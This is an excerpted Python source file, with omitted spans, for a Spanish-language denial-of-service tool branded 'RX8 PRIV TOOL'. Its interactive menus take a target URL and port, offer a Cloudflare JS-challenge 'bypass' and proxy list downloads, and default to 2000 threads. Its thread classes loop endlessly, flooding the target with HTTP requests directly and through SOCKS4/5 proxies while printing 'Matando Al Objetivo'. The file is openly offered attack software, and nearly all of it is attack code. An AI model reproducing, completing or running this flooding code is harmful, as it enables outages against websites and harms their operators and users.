...
def logo():
    if sys.platform.startswith("linux"):
       ...
       os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title  (BY RX8 PRIV TOOL)")
    print('''
██ ▄█▀ ██▓ ██▓     ██▓        █     █░▓█████  ▄▄▄▄      ▓█████▄ ▓█████▄  ▒█████    ██████ 
 ██▄█▒ ▓██▒▓██▒    ▓██▒       ▓█░ █ ░█░▓█   ▀ ▓█████▄    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▓███▄░ ▒██▒▒██░    ▒██░       ▒█░ █ ░█ ▒███   ▒██▒ ▄██   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
...
░  ░    ░      ░  ░    ░  ░       ░       ░  ░ ░            ░       ░        ░ ░        ░  
 #Devolver RX8                                                   ░     ░       ░            
     YOUTUBE : RX8 OR https://www.youtube.com/channel/UC2Cj_NVuOiWd0a-s3P5dQHA  
     DISCORD : RX8#5144
     Version : 1.0
     ''')
    try:
        print("\n[*] Objetivo : " +str(url_main)+ ":" +str(port))
    except:
        pass
    try:
        print("[*] Metodo : " +str(name_method_attack))
    except:
        pass
    try:
        print("[*] Modo   : " +str(filenam2))
    except:
        pass
    try:
        ...
        pass
    try:
        print("[*] Proxy: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
...
def start_url():
    ...
    try:
        ...
        print("[!] Te equivocaste, inténtalo de nuevo [!]")
        start_url()
    logo()
    try:
...
def start_port():
    global port
    print("-----------------------------")
    port = str(input("[*] Puerto [80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[!] Seleccione El Puerto = 443 [!]")
        else:
            port = int(80)
            print("[!] Seleccione El Puerto = 80 [!]")
    else:
        port = int(port)
...
[+]=================================================[+]
""")
    choice_mode = input("[*] Elija el Ataque [0-6]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
        ...
        print("-----------------------------")
        print("|_--> 1: Metodo Bypass v1")
        print("|_--> 2: Metodo Bypass v2")
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[?] Method [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("[!] Seleccione Metodo de Bypass JS v1")
            method_pass_cf = "1"
        else:
            print("[!] Seleccione Metodo de Bypass JS v2")
            method_pass_cf = "2"
        logo()
        pass_cf()
    elif choice_mode == "4":
...
def pass_cf():
    ...
    try:
        ...
        print("[!] El Bypass A Sido Completado!")
        numthreads()
    except:
        error_cf += 1
        print("[!] Error En EL Bypass [" +str(error_cf)+ "]")
        if error_cf>5:
            os.system("cls")
            print("[!] ERROR BYPASS\n[!] Seleccione otro método de ataque o ignore[!]")
            start_mode()
        else:
            pass_cf()
...
def choice_method_attack():
    ...
    if (method_attack == "1") or (method_attack == ""):
        ...
        print("[!] Seleccione Metodo de Ataque Normal")
        method_attack = "1"
    elif method_attack == "2":
        name_method_attack = "Spam"
        print("[!] Seleccione Metodo de Ataque Spam")
    else:
        print ("[!] Te equivocaste, inténtalo de nuevo [!]\n")
        choice_method_attack()
    logo()
...
def choice_down_proxies():
    ...
    if (choice4 == "y") or (choice4 == "Y"):
        print("-----------------------------")
        print("|_--> 1: Servidor X")
        print("|_--> 2: Servedor Z")
        sel_pr = input("[?] Servidor [1/2]: ")
        ...
        print("[!] Seleccionado No Obtener nueva lista " +str(filenam2)+ " [!]")
        proxies_list()
...
def numthreads():
    ...
    try:
        ...
        threads = int(2000)
        print ("[!] Seleccione Los THEREADS " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('=*= Precione Enter Para Iniciar El Ataque: ')
    if choice6 == "":
        #webbrowser.open("https://youtu.be/9WV1EALFiN0", new=0, autoraise=True)
        if ("eduaxd" in url) or ("vnxd" in url) or ("hentxdai" in url) or ("poddrn" in url):
            print("[+] Admin: Salva el alma que está siendo capturada por el mal!")
            sleep(3)
        attack()
        print()
    else:
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] Matando Al Objetivo | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                #sys.stdout.flush()
                print("[!] Matando Al Objetivo | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] Matando Al Objetivo | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] Matando Al Objetivo | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] Matando Al Objetivo | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Matando Al Objetivo | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
